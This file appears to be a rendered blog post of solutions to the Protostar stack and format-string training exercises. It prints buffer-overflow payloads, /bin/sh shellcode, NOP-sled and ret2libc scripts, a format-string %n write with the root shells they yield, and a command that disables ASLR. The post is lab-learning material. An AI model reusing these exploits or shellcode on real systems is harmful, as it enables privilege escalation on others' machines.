@@ -1,0 +1,192 @@
+I"JV<h1 id="introduction">Introduction</h1>
+<p>I’ve done a long time ago the stack exercices of <a href="https://exploit-exercises.lains.space/protostar/">Protostar</a>, they have been sitting for a while on my home folder, thought they might be usefull for someone, here are the solution for stack0-7, manually done before I discovered the joy of pwntools, uncommentend due to time constrains.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c">####STACK1</span>
+user@protostar:/opt/protostar/bin<span class="nv">$ </span>./stack1 <span class="si">$(</span>python <span class="nt">-c</span> <span class="s2">"print 'A'*64+'</span><span class="se">\x</span><span class="s2">64</span><span class="se">\x</span><span class="s2">63</span><span class="se">\x</span><span class="s2">62</span><span class="se">\x</span><span class="s2">61'"</span><span class="si">)</span>
+you have correctly got the variable to the right value
+
+</code></pre></div></div>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c">####STACK2	</span>
+user@protostar:/opt/protostar/bin<span class="nv">$ GREENIE</span><span class="o">=</span><span class="si">$(</span>python <span class="nt">-c</span> <span class="s2">"print 'A'*64+'</span><span class="se">\x</span><span class="s2">0a</span><span class="se">\x</span><span class="s2">0d</span><span class="se">\x</span><span class="s2">0a</span><span class="se">\x</span><span class="s2">0d'"</span><span class="si">)</span> ./stack2 0x0d0a0d0a
+you have correctly modified the variable
+</code></pre></div></div>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c">####STACK3</span>
+user@protostar:/opt/protostar/bin<span class="nv">$ </span>python <span class="nt">-c</span> <span class="s2">"print 'A'*64+'</span><span class="se">\x</span><span class="s2">24</span><span class="se">\x</span><span class="s2">84</span><span class="se">\x</span><span class="s2">04</span><span class="se">\x</span><span class="s2">08'"</span> | ./stack3 0x08048424
+calling <span class="k">function </span>pointer, jumping to 0x08048424
+code flow successfully changed
+
+</code></pre></div></div>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c">####STACK4</span>
+user@protostar:/opt/protostar/bin<span class="nv">$ </span>python <span class="nt">-c</span> <span class="s2">"print 'A'*76+'</span><span class="se">\x</span><span class="s2">f4</span><span class="se">\x</span><span class="s2">83</span><span class="se">\x</span><span class="s2">04</span><span class="se">\x</span><span class="s2">08'"</span> | ./stack4                   
+code flow successfully changed
+
+</code></pre></div></div>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c">####STACK5</span>
+user@protostar:~<span class="nv">$ </span><span class="nb">cat </span>stack5.py
+import struct
+EIP <span class="o">=</span> struct.pack<span class="o">(</span><span class="s2">"I"</span>, 0xbffff790+120<span class="o">)</span>
+<span class="nv">shellcode</span><span class="o">=</span> <span class="s2">"</span><span class="se">\x</span><span class="s2">31</span><span class="se">\x</span><span class="s2">c0</span><span class="se">\x</span><span class="s2">50</span><span class="se">\x</span><span class="s2">68</span><span class="se">\x</span><span class="s2">2f</span><span class="se">\x</span><span class="s2">2f</span><span class="se">\x</span><span class="s2">73</span><span class="se">\x</span><span class="s2">68</span><span class="se">\x</span><span class="s2">68</span><span class="se">\x</span><span class="s2">2f</span><span class="se">\x</span><span class="s2">62</span><span class="se">\x</span><span class="s2">69</span><span class="se">\x</span><span class="s2">6e</span><span class="se">\x</span><span class="s2">89</span><span class="se">\x</span><span class="s2">e3</span><span class="se">\x</span><span class="s2">50</span><span class="se">\x</span><span class="s2">53</span><span class="se">\x</span><span class="s2">89</span><span class="se">\x</span><span class="s2">e1</span><span class="se">\x</span><span class="s2">b0</span><span class="se">\x</span><span class="s2">0b</span><span class="se">\x</span><span class="s2">cd</span><span class="se">\x</span><span class="s2">80"</span>
+<span class="nv">payload</span><span class="o">=</span><span class="s2">"A"</span><span class="k">*</span><span class="o">(</span>76<span class="o">)</span>+EIP+<span class="s2">"</span><span class="se">\x</span><span class="s2">90"</span><span class="k">*</span><span class="o">(</span>100<span class="o">)</span>+shellcode#<span class="s2">"</span><span class="se">\x</span><span class="s2">cc"</span>
+print payload
+user@protostar:~<span class="nv">$ </span><span class="nb">cd</span> /opt/protostar/bin/ <span class="p">;</span> <span class="o">(</span>python /home/user/stack5.py<span class="p">;</span><span class="nb">cat</span><span class="o">)</span> | ./stack5 <span class="p">;</span> <span class="nb">cd</span> -
+<span class="nb">id
+</span><span class="nv">uid</span><span class="o">=</span>1001<span class="o">(</span>user<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>1001<span class="o">(</span>user<span class="o">)</span> <span class="nv">euid</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span> <span class="nb">groups</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span>,1001<span class="o">(</span>user<span class="o">)</span>
+
+
+</code></pre></div></div>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c">##############  STACK6</span>
+user@protostar:~<span class="nv">$ </span><span class="nb">cat </span>stack6.py
+import struct
+
+buff <span class="o">=</span> struct.pack<span class="o">(</span><span class="s2">"I"</span>, 0xbffff6ec<span class="o">)</span>
+
+<span class="nv">shellcode</span><span class="o">=</span> <span class="s2">"</span><span class="se">\x</span><span class="s2">31</span><span class="se">\x</span><span class="s2">c0</span><span class="se">\x</span><span class="s2">50</span><span class="se">\x</span><span class="s2">68</span><span class="se">\x</span><span class="s2">2f</span><span class="se">\x</span><span class="s2">2f</span><span class="se">\x</span><span class="s2">73</span><span class="se">\x</span><span class="s2">68</span><span class="se">\x</span><span class="s2">68</span><span class="se">\x</span><span class="s2">2f</span><span class="se">\x</span><span class="s2">62</span><span class="se">\x</span><span class="s2">69</span><span class="se">\x</span><span class="s2">6e</span><span class="se">\x</span><span class="s2">89</span><span class="se">\x</span><span class="s2">e3</span><span class="se">\x</span><span class="s2">50</span><span class="se">\x</span><span class="s2">53</span><span class="se">\x</span><span class="s2">89</span><span class="se">\x</span><span class="s2">e1</span><span class="se">\x</span><span class="s2">b0</span><span class="se">\x</span><span class="s2">0b</span><span class="se">\x</span><span class="s2">cd</span><span class="se">\x</span><span class="s2">80"</span>
+<span class="c"># bzzzzt !! the program do not allow to execute on the stack, lets bypass this by returning first in the ret of the func, then returning to your shellcode.</span>
+
+<span class="c">#EIP = struct.pack("I", 0xbffff7b0+10)</span>
+<span class="c">#buff = struct.pack("I", 0xbffff6ec)</span>
+
+EIP1 <span class="o">=</span> struct.pack<span class="o">(</span><span class="s2">"I"</span>, 0x080484f9<span class="o">)</span> <span class="c"># Address of return in getpath</span>
+EIP2 <span class="o">=</span> struct.pack<span class="o">(</span><span class="s2">"I"</span>, 0xbffffea4+40<span class="o">)</span> <span class="c"># Address of nopsled</span>
+<span class="nv">payload</span><span class="o">=</span><span class="s2">"A"</span><span class="k">*</span><span class="o">(</span>80<span class="o">)</span>+EIP1+EIP2+<span class="s2">"</span><span class="se">\x</span><span class="s2">90"</span><span class="k">*</span><span class="o">(</span>400<span class="o">)</span>+shellcode
+print payload
+
+user@protostar:~<span class="nv">$ </span><span class="o">(</span>python stack6.py <span class="p">;</span><span class="nb">cat</span> <span class="o">)</span> | <span class="nb">env</span> - /opt/protostar/bin/stack6
+input path please: got path AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒1▒Ph//shh/bin▒▒PS▒▒
+                                                                               ̀
+<span class="nb">id
+</span><span class="nv">uid</span><span class="o">=</span>1001<span class="o">(</span>user<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>1001<span class="o">(</span>user<span class="o">)</span> <span class="nv">euid</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span> <span class="nb">groups</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span>,1001<span class="o">(</span>user<span class="o">)</span>
+Lesson learned: gdb take space <span class="k">in </span>stack, increase size of nops.
+
+
+
+
+</code></pre></div></div>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c">################ STACK6 ret2libc</span>
+user@protostar:~<span class="nv">$ </span><span class="nb">cat </span>stack6_ret2libc.py
+import struct
+
+
+addr_system <span class="o">=</span> struct.pack<span class="o">(</span><span class="s2">"I"</span>,    0xb7ecffb0<span class="o">)</span>
+addr_ret_after <span class="o">=</span> struct.pack<span class="o">(</span><span class="s2">"I"</span>, 0xbffff6ec<span class="o">)</span>
+<span class="nv">addr_shell_str</span><span class="o">=</span> struct.pack <span class="o">(</span><span class="s2">"I"</span>, 0xb7fb63bf<span class="o">)</span>
+
+<span class="nv">payload</span><span class="o">=</span><span class="s2">"A"</span><span class="k">*</span><span class="o">(</span>80<span class="o">)</span>+addr_system+addr_ret_after+addr_shell_str
+print payload
+user@protostar:~<span class="nv">$ </span><span class="o">(</span>python stack6_ret2libc.py <span class="p">;</span> <span class="nb">cat</span> <span class="o">)</span> | <span class="nb">env</span> - /opt/protostar/bin/stack6
+input path please: got path AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA▒▒▒AAAAAAAAAAAA▒▒▒▒▒▒▒▒c▒
+<span class="nb">id
+</span><span class="nv">uid</span><span class="o">=</span>1001<span class="o">(</span>user<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>1001<span class="o">(</span>user<span class="o">)</span> <span class="nv">euid</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span> <span class="nb">groups</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span>,1001<span class="o">(</span>user<span class="o">)</span>
+<span class="nb">exit
+
+</span>Segmentation fault
+user@protostar:~<span class="err">$</span>
+
+
+
+</code></pre></div></div>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c">#################  STACK7 </span>
+user@protostar:~<span class="nv">$ </span><span class="nb">cat </span>stack7_ret2libc.py
+import struct
+
+addr_system <span class="o">=</span> struct.pack<span class="o">(</span><span class="s2">"I"</span>,    0xb7ecffb0<span class="o">)</span>
+addr_ret_after <span class="o">=</span> struct.pack<span class="o">(</span><span class="s2">"I"</span>, 0xb7fb63c7<span class="o">)</span> <span class="c">#points to exit 0</span>
+<span class="nv">addr_shell_str</span><span class="o">=</span> struct.pack <span class="o">(</span><span class="s2">"I"</span>, 0xb7fb63bf<span class="o">)</span>
+addr_ret_gadget <span class="o">=</span> struct.pack<span class="o">(</span><span class="s2">"I"</span>,0x08048544<span class="o">)</span>
+
+<span class="nv">payload</span><span class="o">=</span><span class="s2">"A"</span><span class="k">*</span><span class="o">(</span>80<span class="o">)</span>+addr_ret_gadget+addr_system+addr_ret_after+addr_shell_str
+print payload
+user@protostar:~<span class="nv">$ </span><span class="o">(</span>python stack7_ret2libc.py <span class="p">;</span> <span class="nb">cat</span> <span class="o">)</span> | <span class="nb">env</span> - /opt/protostar/bin/stack7
+input path please: got path AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAADAAAAAAAAAAAAD▒▒▒▒c▒c▒
+<span class="nb">id
+</span><span class="nv">uid</span><span class="o">=</span>1001<span class="o">(</span>user<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>1001<span class="o">(</span>user<span class="o">)</span> <span class="nv">euid</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span> <span class="nb">groups</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span>,1001<span class="o">(</span>user<span class="o">)</span>
+</code></pre></div></div>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c">##################### ######## FORMAT</span>
+user@protostar:~<span class="nv">$ </span><span class="nb">cat </span>format0.py
+
+
+import struct
+
+
+<span class="nv">payload</span><span class="o">=</span> <span class="s2">"A"</span><span class="k">*</span>64+<span class="s2">"</span><span class="se">\x</span><span class="s2">ef</span><span class="se">\x</span><span class="s2">be</span><span class="se">\x</span><span class="s2">ad</span><span class="se">\x</span><span class="s2">de"</span>
+print payload
+user@protostar:~<span class="nv">$ </span><span class="nb">env</span> - /opt/protostar/bin/format0 <span class="si">$(</span>python format0.py<span class="si">)</span>
+you have hit the target correctly :<span class="o">)</span>
+</code></pre></div></div>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c">############################### FORMAT1</span>
+1user@protostar:~<span class="nv">$ </span>./format1 <span class="s2">"</span><span class="sb">`</span>python <span class="nt">-c</span> <span class="s2">"print 'AAAAAAAAA'+'</span><span class="se">\x</span><span class="s2">38</span><span class="se">\x</span><span class="s2">96</span><span class="se">\x</span><span class="s2">04</span><span class="se">\x</span><span class="s2">08'+'BBBBBB'+'%x'*130+' %x' "</span> <span class="sb">`</span><span class="s2">"</span>
+AAAAAAAAA8BBBBBB804960cbffff6d88048469b7fd8304b7fd7ff4bffff6d88048435bffff8a3b7ff1040804845bb7fd7ff480484500bffff758b7eadc762bffff784bffff790b7fe1848bffff740ffffffffb7ffeff4804824d1bffff740b7ff0626b7fffab0b7fe1b28b7fd7ff400bffff758d2412337f8149527000280483400b7ff6210b7eadb9bb7ffeff42804834008048361804841c2bffff78480484508048440b7ff1040bffff77cb7fff8f82bffff899bffff8a30bffff9bebffff9ccbffff9d7bffff9f7bffffa0abffffa14bfffff04bfffff42bfffff56bfffff65bfffff76bfffff7ebfffff8ebfffff9bbfffffccbfffffe6020b7fe241421b7fe200010178bfbbf61000116438048034420577b7fe30008098048340b3e9c0d3e9e3e917119bffff87b1fbffffff2fbffff88b000510000007106844f272416d673baa31369c378fd36383600662f2e00616d726f410031744141414141414141 8049638user@protostar:~<span class="nv">$ </span>./format1 <span class="s2">"</span><span class="sb">`</span>python <span class="nt">-c</span> <span class="s2">"print 'AAAAAAAAA'+'</span><span class="se">\x</span><span class="s2">38</span><span class="se">\x</span><span class="s2">96</span><span class="se">\x</span><span class="s2">04</span><span class="se">\x</span><span class="s2">08'+'BBBBBB'+'%x'*130+' %n' "</span> <span class="sb">`</span><span class="s2">"</span>
+AAAAAAAAA8BBBBBB804960cbffff6d88048469b7fd8304b7fd7ff4bffff6d88048435bffff8a3b7ff1040804845bb7fd7ff480484500bffff758b7eadc762bffff784bffff790b7fe1848bffff740ffffffffb7ffeff4804824d1bffff740b7ff0626b7fffab0b7fe1b28b7fd7ff400bffff75852af93fd78fa25ed000280483400b7ff6210b7eadb9bb7ffeff42804834008048361804841c2bffff78480484508048440b7ff1040bffff77cb7fff8f82bffff899bffff8a30bffff9bebffff9ccbffff9d7bffff9f7bffffa0abffffa14bfffff04bfffff42bfffff56bfffff65bfffff76bfffff7ebfffff8ebfffff9bbfffffccbfffffe6020b7fe241421b7fe200010178bfbbf61000116438048034420577b7fe30008098048340b3e9c0d3e9e3e917119bffff87b1fbffffff2fbffff88b000850000002970f43b224156a14c3de51669ac41c936383600662f2e00616d726f410031744141414141414141 you have modified the target :<span class="o">)</span>
+user@protostar:~<span class="err">$</span>
+<span class="c">################################################################</span>
+</code></pre></div></div>
+
+<h1 id="some-of-my-notes-during-the-attempts">Some of my notes during the attempts</h1>
+
+<h2 id="endianness">Endianness</h2>
+<ul>
+  <li>lscpu</li>
+  <li>echo -n I | od -to2 | head -n1 | cut -f2 -d” “ | cut -c6<br />
+Big Endian-System =1</li>
+</ul>
+
+<h2 id="gdb">Gdb</h2>
+<ul>
+  <li>continue &lt;= continue until next break</li>
+  <li>define X &lt;= define a macro and finish with “end”</li>
+  <li>start arg1 arg2 ..&lt;= run until breakpoint and pass args to program</li>
+  <li>run arg1 arg2 ..&lt;= run and ignore breakpoint and pass args to program</li>
+  <li>b *ADDRESS &lt;= add break on that address</li>
+  <li>del ADDRESS &lt;= delete breakpoint</li>
+  <li>break main &lt;= bypass function prolog</li>
+  <li>break *main &lt;= break before function prolog</li>
+  <li>break *ADDRESS &lt;= DUNO WHY else its pending ….</li>
+  <li>next =&gt; Go to next instruction (source line) but donʻt dive into functions.</li>
+  <li>finish =&gt; Continue until the current function re-turns.</li>
+  <li>continue =&gt; Continue normal execution</li>
+  <li>info fun</li>
+  <li>x/100x $sp =&gt; show stack memory</li>
+  <li>info frame =&gt; callstack</li>
+  <li>info registers &lt;= show all registers</li>
+  <li>i r eip &lt;= show eip</li>
+  <li>x/[Length][Format] [Address expression] &lt;= Displays the memory contents at a given address using the specified format.</li>
+  <li>w - word (32-bit value)</li>
+  <li>g - giant word (64-bit value)</li>
+  <li>I instruction</li>
+  <li>set disassembly-flavor intel &lt;= Destination Source</li>
+  <li>define hook-stop &lt;= script gdb commands to execute on breakpoint, finish with “end”</li>
+  <li>info symbol ADDRESS &lt;= show what function that address corresponds</li>
+</ul>
+
+<h2 id="general-info">General Info</h2>
+<ul>
+  <li>objdump -t  &lt;= list symbols of a binary</li>
+  <li>Stripped variable names removed</li>
+  <li>Staticly linked : libraries compiled in the binary (big binary)</li>
+  <li>When sending shellcode payload, add a cat like :
+    <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">(</span>python <span class="nt">-c</span> <span class="s2">"AAA..."</span> <span class="p">;</span> <span class="nb">cat</span><span class="o">)</span> | ./bin
+</code></pre></div>    </div>
+  </li>
+  <li>to get function address: disasemble the function and get the first address</li>
+  <li>Linux Ubuntu 18.04 payload needs to be multiple of 16byte</li>
+  <li><a href="https://stackoverflow.com/questions/17775186/buffer-overflow-works-in-gdb-but-not-without-it/17775966#17775966">GDB adding offset in memory</a></li>
+  <li><a href="https://reverseengineering.stackexchange.com/questions/2983/how-to-predict-address-space-layout-differences-between-real-and-gdb-controlled">Predict GDB offset</a></li>
+  <li><a href="https://www.youtube.com/watch?v=m17mV24TgwY&amp;list=PLhixgUqwRTjxglIswKp9mpkfPNfHkzyeN&amp;index=16">ret2libc</a></li>
+</ul>
+
+<h2 id="defense-mechanisms">Defense Mechanisms</h2>
+<ul>
+  <li><a href="https://ctf101.org/binary-exploitation/stack-canaries/">Stack Canaries</a>  are a secret value placed on the stack which changes every time the program is started.
+Prior to a function return, the stack canary is checked and if it appears to be modified, the program exits immeadiately.
+Return instruction pointers are usually protected by stack canaries.</li>
+  <li>Data Execution Prevention  &lt;== rwe in stack/memory etc to prevent jumping to shellcode, but defeated by ret2libc</li>
+  <li>ASLR Address Space Layout Randomization, prenveting to get addresss of libc.</li>
+  <li>Disable ASLR on the running system:</li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">echo </span>0 | <span class="nb">sudo tee</span> /proc/sys/kernel/randomize_va_space
+</code></pre></div></div>
+:ET
